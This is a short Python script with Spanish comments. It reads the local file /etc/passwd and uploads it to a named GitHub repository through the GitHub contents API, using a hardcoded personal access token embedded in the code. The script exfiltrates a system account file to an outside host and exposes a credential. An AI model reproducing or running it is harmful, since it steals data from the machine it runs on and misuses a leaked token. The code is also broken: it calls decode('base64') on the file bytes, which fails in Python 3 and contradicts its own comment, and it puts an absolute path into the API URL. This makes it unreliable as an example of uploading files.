import requests

def upload_to_github(token, repo_owner, repo_name, file_path, commit_message):
    # URL de la API para crear o actualizar un archivo en el repositorio
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"

    # Lee el contenido del archivo binario
    with open(file_path, "rb") as file:
        file_content = file.read()

    # Construye el encabezado de la solicitud con el token de acceso
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }

    # Construye el cuerpo de la solicitud
    data = {
        "message": commit_message,
        "content": file_content.decode("base64"),  # Convierte el contenido a base64
    }

    # Realiza la solicitud PUT para subir el archivo
    response = requests.put(url, headers=headers, json=data)

    if response.status_code == 201:
        print("Archivo subido exitosamente.")
    else:
        print(f"Error al subir el archivo. Código de estado: {response.status_code}")
        print(response.text)

# Configuración
token = "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"
repo_owner = "lauraalmrui"
repo_name = "almacenlar"
file_path = "/etc/passwd"
commit_message = "Listo!!!"

# Llama a la función para subir el archivo
upload_to_github(token, repo_owner, repo_name, file_path, commit_message)
